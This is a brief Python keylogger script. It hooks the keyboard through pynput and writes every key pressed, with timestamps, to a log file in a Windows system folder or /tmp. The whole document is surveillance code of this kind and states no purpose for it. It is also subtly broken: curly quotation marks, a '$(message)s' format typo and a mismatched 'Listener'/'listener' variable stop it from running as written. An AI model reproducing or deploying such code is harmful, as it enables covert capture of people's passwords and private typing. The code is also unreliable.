#!/usr/bin/python3
# install pynput with ’user@distro:~$ sudo pip3 install pynput’
from pynput.keyboard import Key, Listener
import logging
import sys

def on_key_press(key):
    try:
        logging.log(10, key.char)
    except:
        logging.log(10, key.name)

if sys.platform == "win32" or sys.platform == "cygwin":
    logfile = "C:\\Windows\\keys.log"
else:
    logfile = "/tmp/keys.log"

logging.basicConfig(filename=logfile, level=logging.DEBUG, format=’%(asctime)s: $(message)s’)

with Listener(on_key_press) as Listener:
    listener.join()
